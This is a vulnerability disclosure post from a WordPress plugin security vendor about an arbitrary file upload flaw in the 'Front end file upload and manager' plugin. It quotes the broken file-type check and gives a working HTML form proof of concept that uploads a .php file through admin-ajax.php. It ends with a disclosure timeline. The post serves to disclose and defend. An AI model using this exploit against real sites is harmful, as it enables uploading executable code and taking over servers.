
[Login](https://www.pluginvulnerabilities.com/my-account/ "Login / Register")
[# Plugin Vulnerabilities

## A service to protect your site against vulnerabilities in WordPress plugins.](https://www.pluginvulnerabilities.com/ "A service to protect your site against vulnerabilities in WordPress plugins.")

* [Sign Up](https://www.pluginvulnerabilities.com/product/subscription/)
  + [Set Up](https://www.pluginvulnerabilities.com/set-up/)
* [Why Plugin Vulnerabilities?](https://www.pluginvulnerabilities.com/why-plugin-vulnerabilities/)
  + [We Provide Fixes for Vulnerabilities](https://www.pluginvulnerabilities.com/we-provide-fixes-for-wordpress-plugin-vulnerabilities/)
  + [We Provide Accurate Vulnerability Information](https://www.pluginvulnerabilities.com/we-provide-accurate-information-on-the-affected-versions-of-vulnerable-wordpress-plugins/)
  + [Insightful Blocked Exploit Attempt Reporting](https://www.pluginvulnerabilities.com/insightful-blocked-exploit-attempt-reporting-from-a-wordpress-firewall-plugin/)
  + [How We Are Improving the Security of WordPress Plugins](https://www.pluginvulnerabilities.com/how-we-are-improving-the-security-of-wordpress-plugins/)
  + [Proactive Monitoring for Vulnerabilities in New Versions of WordPress Plugins](https://www.pluginvulnerabilities.com/proactive-monitoring-for-vulnerabilities-in-new-versions-of-wordpress-plugins/)
  + [Select Plugins to Receive Security Reviews](https://www.pluginvulnerabilities.com/wordpress-plugin-security-reviews/)
* Our Plugins
  + [Plugin Vulnerabilities Firewall](https://www.pluginvulnerabilities.com/plugin-vulnerabilities-firewall/)
  + [Lockdown Mode Plugin for WordPress](https://www.pluginvulnerabilities.com/lockdown-mode-plugin/)
  + [2FA for WooCommerce](https://www.pluginvulnerabilities.com/two-factor-authentication-2fa-for-woocommerce-plugin/)
* Other Services
  + [Plugin Security Review](https://www.pluginvulnerabilities.com/wordpress-plugin-security-review-service/)
  + [Continuous Plugin Security Review Service](https://www.pluginvulnerabilities.com/continuous-wordpress-plugin-security-review-service/)
  + [Theme Security Review](https://www.pluginvulnerabilities.com/wordpress-theme-security-review-service/)
  + [Hacked WordPress Website Cleanup](https://www.whitefirdesign.com/services/hacked-wordpress-website-cleanup.html)
  + [Abandoned WordPress Plugin Maintenance Service](https://www.whitefirdesign.com/services/abandoned-wordpress-plugin-maintenance.html)
  + [Blue Hat Hacking Service for WordPress Plugins/Websites](https://www.pluginvulnerabilities.com/blue-hat-hacking-service-for-wordpress-plugins-websites/)
  + [Plugin Vulnerabilities Subscription for ClassicPress](https://www.pluginvulnerabilities.com/product/plugin-vulnerabilities-subscription-for-classicpress/)
  + [Plugin Vulnerabilities Daily Newsletter](https://www.pluginvulnerabilities.com/product/plugin-vulnerabilities-daily-newsletter/)
  + [Solutions for Web Hosts](https://www.pluginvulnerabilities.com/solutions-for-web-hosts/)
  + [Solutions for Security Providers](https://www.pluginvulnerabilities.com/solutions-for-security-providers/)
* [Plugin Search](https://www.pluginvulnerabilities.com/plugin-search/)
  + [Search WooCommerce Plugins](https://www.pluginvulnerabilities.com/plugin-search/?woocommerce=)
  + [Search Elementor Plugins](https://www.pluginvulnerabilities.com/plugin-search/?elementor=)
* [Research](https://www.pluginvulnerabilities.com/blog/)
  + [Unfixed Security Issues in WordPress](https://www.pluginvulnerabilities.com/unfixed-security-issues-in-wordpress/)
  + [Latest WordPress News](https://www.pluginvulnerabilities.com/latest-wordpress-news/)
  + [Latest ClassicPress News](https://www.pluginvulnerabilities.com/latest-classicpress-news/)
  + [What WordPress Plugins Are No Longer Receiving Updates Through the WordPress Plugin Directory?](https://www.pluginvulnerabilities.com/2024/10/22/what-wordpress-plugins-are-no-longer-receiving-updates-through-the-wordpress-plugin-directory/)
  + [WordPress Firewall Plugin Protection Comparison](https://www.pluginvulnerabilities.com/wordpress-firewall-plugin-protection-comparison/)
  + [Security Advisories on WordPress Plugin Developers](https://www.pluginvulnerabilities.com/security-advisories-on-wordpress-plugin-developers/)
  + [Send us a Tip](https://www.pluginvulnerabilities.com/news-tip/)
* [About](https://www.pluginvulnerabilities.com/about/)
  + [WordPress Plugin Zero-Day Vulnerability Exploitation Info Sharing Partnership](https://www.pluginvulnerabilities.com/wordpress-plugin-zero-day-vulnerability-exploitation-info-sharing-partnership/)
  + [Get Free Help Fixing A Security Vulnerability In Your WordPress Plugin](https://www.pluginvulnerabilities.com/get-free-help-fixing-a-security-vulnerability-in-your-wordpress-plugin/)
  + [Contact Us](https://www.pluginvulnerabilities.com/contact/)
  + [Feedback](https://www.pluginvulnerabilities.com/feedback/)
  + [Report a WordPress Plugin Vulnerability We Are Missing](https://www.pluginvulnerabilities.com/report-a-vulnerability/)

19
Sep
2016

# Arbitrary File Upload Vulnerability in Front end file upload and manager Plugin

After discovering an [arbitrary file upload vulnerability in the plugin N-Media Post Front-end Form recently](https://www.pluginvulnerabilities.com/2016/09/19/arbitrary-file-upload-vulnerability-in-n-media-post-front-end-form/), we took a look at other plugins from the same developer and found that three other shared same the same vulnerable code. One of those is [Front end file upload and manager Plugin](https://wordpress.org/plugins/nmedia-user-file-uploader/).

In the case of this plugin, the developer had actually tried to restrict what kind of files could be uploaded, unlike the other plugin:

| ``` 737 738 739 740 741 742 743 744 745 746 747 748  ``` | ``` /* ========== Invalid File type checking ========== */ $file_type = wp_check_filetype($_REQUEST ["name"], null );   $allowed_types = explode(',', $this->get_option('_file_types')); //var_dump($allowed_types);   if( !in_array($file_type['ext'], $allowed_types) ){ 	$response ['status'] = 'error'; 	$response ['message'] = __ ( 'File type not valid', 'nm-filemanager' ); 	die ( json_encode($response) ); } /* ========== Invalid File type checking ========== */ ``` |
| --- | --- |

/\* ========== Invalid File type checking ========== \*/
$file\_type = wp\_check\_filetype($\_REQUEST ["name"], null );
$allowed\_types = explode(',', $this->get\_option('\_file\_types'));
//var\_dump($allowed\_types);
if( !in\_array($file\_type['ext'], $allowed\_types) ){
$response ['status'] = 'error';
$response ['message'] = \_\_ ( 'File type not valid', 'nm-filemanager' );
die ( json\_encode($response) );
}
/\* ========== Invalid File type checking ========== \*/

The problem is that in the plugin’s default state it doesn’t work properly for .php files, which seems to be more WordPress’ fault than the developers. The plugin tries to get the file to be uploaded’s file extension using WordPress’ function [wp\_check\_filetype()](https://codex.wordpress.org/Function_Reference/wp_check_filetype). What isn’t mentioned in that function’s documentation is that it only returns the file’s extension and type if the file extension is one that is permitted to be uploaded by WordPress. The plugin’s code then checks if the extension is one that is allowed to be uploaded by the plugin’s settings and exits if it isn’t. Since by default no extensions are set to be allowed, the .php files empty extension will be seen as being allowed and the file is uploaded.

## Proof of Concept

The following proof of concept will upload the selected file to the directory /wp-content/uploads/user\_uploads/ as upload.php.

Make sure to replace “[path to WordPress]” with the location of WordPress.

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/admin-ajax.php" method="POST" enctype="multipart/form-data">
<input type="hidden" name="action" value="nm_filemanager_upload_file" />
<input type="hidden" name="name" value="upload.php" />
<input type="file" name="file" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```
## Timeline

* 7/16/2016 – Developer notified.
* 7/16/2016 – Developer responds.
* 9/19/2016 – WordPress.org Plugin Directory notified.
* 9/21/2016 – Plugin removed from WordPress.org Plugin Directory.
* 9/24/2016 – Version 4.0 released, which fixes vulnerability.

No related posts.

---

### Concerned About The Security of the Plugins You Use?

When you are a paying customer of our service, [you can suggest/vote for the WordPress plugins you use to receive a security review from us](https://www.pluginvulnerabilities.com/wordpress-plugin-security-reviews/). You can start using the service for free when you sign up now. We also offer [security reviews of WordPress plugins as a separate service](https://www.pluginvulnerabilities.com/wordpress-plugin-security-review-service/).
[Plugin Vulnerabilities](https://www.pluginvulnerabilities.com)
Posted in [Vulnerability Report](https://www.pluginvulnerabilities.com/category/vulnerability-report/)
[Arbitrary File Upload](https://www.pluginvulnerabilities.com/tag/arbitrary-file-upload/), [Front end file upload and manager Plugin](https://www.pluginvulnerabilities.com/tag/front-end-file-upload-and-manager-plugin/), [Vulnerability Report](https://www.pluginvulnerabilities.com/tag/vulnerability-report/)
[Leave a comment](https://www.pluginvulnerabilities.com/2016/09/19/arbitrary-file-upload-vulnerability-in-front-end-file-upload-and-manager-plugin/#respond)

# Post navigation

### Leave a Reply [Cancel reply](/2016/09/19/arbitrary-file-upload-vulnerability-in-front-end-file-upload-and-manager-plugin/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

In order to pass the CAPTCHA please enable JavaScript

### What WordPress Security issue do you need help with today?

Protecting Your WordPress Websites

Cleaning Up Hacked WordPress Websites

Ensuring WordPress Websites are Secure

Fixing a Vulnerable WP Plugin You Use

Ensuring a WordPress Plugin is Secure

Maintenance for Abandoned WP Plugin

Ensuring a WordPress Theme is Secure

Protecting Your Customers’ Websites

Fixing a Vulnerable Plugin You Develop

How Many Websites Do You Have?
1
2-10
11+

How Critical is it That Your Website Remain Secure?
Low
Medium
High

or

### Latest WordPress Plugin Security Scorecard Grades

* ![](/wp-content/plugins/pv-plugin-security-scorecard/plugin-icon/wp-cfm)[WP-CFM](https://www.pluginvulnerabilities.com/plugin-security-scorecard/?slug=wp-cfm)     C
* ![](/wp-content/plugins/pv-plugin-security-scorecard/plugin-icon/yoast-test-helper)[Yoast Test Helper](https://www.pluginvulnerabilities.com/plugin-security-scorecard/?slug=yoast-test-helper)     C+
* ![](/wp-content/plugins/pv-plugin-security-scorecard/plugin-icon/white-label-cms)[White Label CMS](https://www.pluginvulnerabilities.com/plugin-security-scorecard/?slug=white-label-cms)     C+
* ![](/wp-content/plugins/pv-plugin-security-scorecard/plugin-icon/white-label)[White Label](https://www.pluginvulnerabilities.com/plugin-security-scorecard/?slug=white-label)     B
* ![](/wp-content/plugins/pv-plugin-security-scorecard/plugin-icon/html-forms)[HTML Forms](https://www.pluginvulnerabilities.com/plugin-security-scorecard/?slug=html-forms)     C+
* [See More Recent Grades](https://www.pluginvulnerabilities.com/plugin-security-scorecard/?results=recent)
* [Check Another Plugin](https://www.pluginvulnerabilities.com/plugin-security-scorecard/)
* [Limit Login Attempts vs WpBom](/plugin-security-scorecard/?slug=limit-login-attempts&vs=wpbom)
### Latest News

* [The New Executive Director of WordPress.org is Now Claiming to Only Spend 5 Hours a Week on WordPress](https://www.pluginvulnerabilities.com/2025/01/10/the-new-executive-director-of-wordpress-org-is-now-claiming-to-only-spend-5-hours-a-week-on-wordpress/)
* [Automattic Employee Changed WordPress Plugin Directory Search Algorithm to Promote Automattic’s Jetpack Plugin](https://www.pluginvulnerabilities.com/2025/01/10/automattic-employee-changed-wordpress-plugin-directory-search-algorithm-to-promote-automattics-jetpack-plugin/)
* [Matt Mullenweg’s Lawyers Claim WordPress News Blog Posts “Lack the Characteristics of Typical Fact-Based Documents”](https://www.pluginvulnerabilities.com/2025/01/03/matt-mullenwegs-lawyers-claim-wordpress-news-blog-posts-lack-the-characteristics-of-typical-fact-based-documents/)
### Follow Us

* [Google News](https://news.google.com/publications/CAAqBwgKMNaxwAsw6MzXAw)
* [Bluesky](https://bsky.app/profile/pluginvulns.bsky.social)
* [RSS](https://www.pluginvulnerabilities.com/category/news/feed/)
### Latest Plugin Security Reviews

* [WordPress Plugin Security Review: WP API Privacy](https://www.pluginvulnerabilities.com/2024/11/18/wordpress-plugin-security-review-wp-api-privacy/)
* [WordPress Plugin Security Review: Two Factor](https://www.pluginvulnerabilities.com/2024/09/17/wordpress-plugin-security-review-two-factor/)
* [WordPress Plugin Security Review: Download Monitor](https://www.pluginvulnerabilities.com/2024/09/06/wordpress-plugin-security-review-download-monitor/)

Powered by WordPress and WooCommerce

© 2016-2025 [White Fir Design LLC](http://www.whitefirdesign.com/) | [Privacy Policy](/privacy-policy/)
 Fruitful theme by [fruitfulcode](http://fruitfulcode.com)

[↑](#top "Back to top")

![](https://www.pluginvulnerabilities.com/piwik/piwik.php?idsite=1&rec=1)

